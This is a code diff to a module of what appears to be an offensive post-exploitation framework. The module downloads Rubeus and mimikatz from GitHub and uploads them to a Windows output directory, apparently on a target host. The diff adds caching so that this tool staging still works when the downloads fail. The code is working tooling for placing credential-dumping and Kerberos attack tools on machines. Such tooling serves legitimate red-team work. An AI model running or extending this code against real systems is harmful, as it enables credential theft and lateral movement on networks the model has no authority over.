@@ -1,16 +1,18 @@
 from __future__ import annotations
 
+import io
 import os
-import tempfile
 import time
 import urllib.request
 import zipfile
 
 from koi.modules.blueprint import KoiModule
+from koi.utils.cache import cache_path, get_cache, put_cache
 from koi.utils.config import TIMEOUTS
 from koi.utils.ui import alert, accent
 
 MIMIKATZ_ZIP_URL = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
+MIMIKATZ_ZIP_CACHE_NAME = "armory_mimikatz_trunk.zip"
 
 TOOLS: dict[str, str] = {
     "Rubeus.exe":      "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/Rubeus.exe",
@@ -34,21 +36,34 @@ class PopulateWinModule(KoiModule):
         },
     ]
 
-    def _fetch_url(self, url: str) -> bytes:
+    def _fetch_url(self, url: str, cache_name: str) -> tuple[bytes, str]:
         """Download *url* locally and return its raw bytes."""
-        with urllib.request.urlopen(url, timeout=TIMEOUTS["http_fetch"]) as resp:
-            return resp.read()
-
-    def _fetch_mimikatz_exe(self) -> bytes:
-        """Download mimikatz_trunk.zip locally and return the x64/mimikatz.exe bytes."""
-        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
-            tmp_path = tmp.name
         try:
-            urllib.request.urlretrieve(MIMIKATZ_ZIP_URL, tmp_path)
-            with zipfile.ZipFile(tmp_path) as zf:
-                return zf.read("x64/mimikatz.exe")
-        finally:
-            os.unlink(tmp_path)
+            with urllib.request.urlopen(url, timeout=TIMEOUTS["http_fetch"]) as resp:
+                data = resp.read()
+            put_cache(cache_name, data)
+            return data, "remote"
+        except Exception:
+            cached = get_cache(cache_name)
+            if cached is None:
+                raise
+            return cached, "cache"
+
+    def _fetch_mimikatz_exe(self) -> tuple[bytes, str]:
+        """Download mimikatz_trunk.zip locally and return the x64/mimikatz.exe bytes."""
+        try:
+            with urllib.request.urlopen(MIMIKATZ_ZIP_URL, timeout=TIMEOUTS["http_fetch"]) as resp:
+                zip_bytes = resp.read()
+            put_cache(MIMIKATZ_ZIP_CACHE_NAME, zip_bytes)
+            source = "remote"
+        except Exception:
+            zip_bytes = get_cache(MIMIKATZ_ZIP_CACHE_NAME)
+            if zip_bytes is None:
+                raise
+            source = "cache"
+
+        with zipfile.ZipFile(io.BytesIO(zip_bytes)) as zf:
+            return zf.read("x64/mimikatz.exe"), source
 
     def run(self) -> None:
         out_dir = (self.args.output_dir or ".").rstrip("\\")
@@ -60,9 +75,10 @@ class PopulateWinModule(KoiModule):
 
         for name, url in TOOLS.items():
             dest = f"{out_dir}\\{name}"
+            cache_name = f"armory_{name}"
             with self.spinner(f"Fetching and uploading {name}..."):
                 try:
-                    raw = self._fetch_url(url)
+                    raw, source = self._fetch_url(url, cache_name)
                     ok  = self._upload_bytes(raw, dest)
                     if ok:
                         time.sleep(1.0)
@@ -71,12 +87,15 @@ class PopulateWinModule(KoiModule):
                     ok = False
                     results[name] = f"error: {exc}"
                     continue
+            if ok and source == "cache":
+                self.ok(f"Using cached {name} ({cache_path(cache_name)})")
             results[name] = dest if ok else "FAILED"
 
         dest = f"{out_dir}\\mimikatz.exe"
         with self.spinner("Downloading mimikatz..."):
+            source = "remote"
             try:
-                raw = self._fetch_mimikatz_exe()
+                raw, source = self._fetch_mimikatz_exe()
                 ok  = self._upload_bytes(raw, dest)
                 if ok:
                     time.sleep(1.0)
@@ -84,6 +103,8 @@ class PopulateWinModule(KoiModule):
             except Exception as exc:
                 ok = False
                 results["mimikatz.exe"] = f"error: {exc}"
+        if ok and source == "cache":
+            self.ok(f"Using cached mimikatz.exe ({cache_path(MIMIKATZ_ZIP_CACHE_NAME)})")
         if "mimikatz.exe" not in results:
             results["mimikatz.exe"] = dest if ok else "FAILED"
 
